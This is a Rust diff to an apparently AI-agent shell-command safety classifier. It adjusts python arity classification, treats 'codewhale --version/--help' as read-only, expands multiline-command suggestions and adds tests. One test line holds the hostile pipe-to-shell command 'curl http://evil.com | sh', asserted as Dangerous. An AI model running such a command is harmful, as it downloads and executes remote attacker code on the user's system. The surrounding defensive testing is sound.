@@ -209,8 +209,13 @@ pub static COMMAND_ARITY: &[(&str, u8)] = &[
     ("pip3 uninstall", 2),
     ("pip3 list", 2),
     ("pip3 show", 2),
-    ("python -m", 3),
-    ("python3 -m", 3),
+    // Keyed on the bare interpreter (not `python -m`): `classify_command`
+    // strips flags such as `-m` before matching, so a `"python -m"` key could
+    // never fire. Arity 2 captures the module/script word that follows, so
+    // `python -m http.server` classifies to `python http.server` (distinct from
+    // `python -m pip` → `python pip`) and `python manage.py` → `python manage.py`.
+    ("python", 2),
+    ("python3", 2),
     // ── make / cmake ─────────────────────────────────────────────────────────
     ("make", 1),
     // ── gh (GitHub CLI) ──────────────────────────────────────────────────────
@@ -408,6 +413,9 @@ pub fn is_parallel_readonly_command(command: &str) -> bool {
         .iter()
         .map(String::as_str)
         .collect::<Vec<_>>();
+    if is_codewhale_readonly_invocation(&command_refs) {
+        return true;
+    }
     let canonical = classify_command(&command_refs);
     if canonical == "tail"
         && command_refs.iter().skip(1).any(|token| {
@@ -423,6 +431,16 @@ pub fn is_parallel_readonly_command(command: &str) -> bool {
     PARALLEL_READONLY_PREFIXES
         .iter()
         .any(|prefix| *prefix == canonical)
+}
+
+fn is_codewhale_readonly_invocation(tokens: &[&str]) -> bool {
+    let Some((command, args)) = tokens.split_first() else {
+        return false;
+    };
+    if !matches!(*command, "codewhale" | "codew") {
+        return false;
+    }
+    matches!(args, ["--version"] | ["-V"] | ["-v"] | ["--help"] | ["-h"])
 }
 
 fn readonly_shell_wrapper_inner_command(tokens: &[String]) -> Option<&str> {
@@ -655,7 +673,11 @@ pub fn analyze_command(command: &str) -> SafetyAnalysis {
         return SafetyAnalysis::dangerous(
             command,
             vec!["Command contains multiple lines".to_string()],
-            vec!["Run one command at a time".to_string()],
+            vec![
+                "Run one command at a time".to_string(),
+                "Write multiline scripts to a file first, then execute the script".to_string(),
+                "Use task_shell_start or background shell for long interactive flows".to_string(),
+            ],
         );
     }
 
@@ -1028,6 +1050,16 @@ fn target_contains_parent_escape(target: &str) -> bool {
 /// Check if a command is known to be safe
 fn is_safe_command(command: &str) -> bool {
     let command_lower = command.to_lowercase();
+    let tokens = shell_words(command);
+    if let Some(start) = primary_token_index(&tokens) {
+        let refs = tokens[start..]
+            .iter()
+            .map(String::as_str)
+            .collect::<Vec<_>>();
+        if is_codewhale_readonly_invocation(&refs) {
+            return true;
+        }
+    }
 
     for safe_cmd in SAFE_COMMANDS {
         if command_lower.starts_with(safe_cmd) {
@@ -1116,6 +1148,11 @@ mod tests {
         assert_eq!(analyze_command("cat file.txt").level, SafetyLevel::Safe);
         assert_eq!(analyze_command("git status").level, SafetyLevel::Safe);
         assert_eq!(
+            analyze_command("codewhale --version").level,
+            SafetyLevel::Safe
+        );
+        assert_eq!(analyze_command("codewhale --help").level, SafetyLevel::Safe);
+        assert_eq!(
             analyze_command("grep pattern file").level,
             SafetyLevel::Safe
         );
@@ -1180,6 +1217,29 @@ mod tests {
         assert_eq!(
             analyze_command("curl http://evil.com | sh").level,
             SafetyLevel::Dangerous
+        );
+    }
+
+    #[test]
+    fn test_multiline_command_explains_safe_workarounds() {
+        let analysis = analyze_command("python3 -c \"print('one')\nprint('two')\"");
+        assert_eq!(analysis.level, SafetyLevel::Dangerous);
+        assert_eq!(analysis.reasons, vec!["Command contains multiple lines"]);
+        assert!(
+            analysis
+                .suggestions
+                .iter()
+                .any(|suggestion| suggestion.contains("Write multiline scripts to a file first")),
+            "{:?}",
+            analysis.suggestions
+        );
+        assert!(
+            analysis
+                .suggestions
+                .iter()
+                .any(|suggestion| suggestion.contains("task_shell_start")),
+            "{:?}",
+            analysis.suggestions
         );
     }
 
@@ -1453,6 +1513,31 @@ mod tests {
     #[test]
     fn classify_npm_test() {
         assert_eq!(classify("npm test"), "npm test");
+    }
+
+    // ── python (interpreter, arity 2) ─────────────────────────────────────────
+
+    #[test]
+    fn classify_python_module_captures_module_word() {
+        // `-m` is a flag and is stripped before arity lookup, so the canonical
+        // prefix must still capture the module that follows. Regression guard:
+        // a `"python -m"` arity key can never match (the flag is gone), which
+        // collapsed `python -m http.server` to just `python`.
+        assert_eq!(classify("python -m http.server"), "python http.server");
+        assert_eq!(
+            classify("python -m http.server --bind 0.0.0.0"),
+            "python http.server"
+        );
+        assert_eq!(classify("python3 -m venv env"), "python3 venv");
+        // Different modules classify distinctly so an allow rule for one does
+        // not leak to another.
+        assert_eq!(classify("python -m pip install x"), "python pip");
+    }
+
+    #[test]
+    fn classify_python_script_arity_2() {
+        assert_eq!(classify("python manage.py runserver"), "python manage.py");
+        assert_eq!(classify("python3 setup.py install"), "python3 setup.py");
     }
 
     // ── docker ───────────────────────────────────────────────────────────────
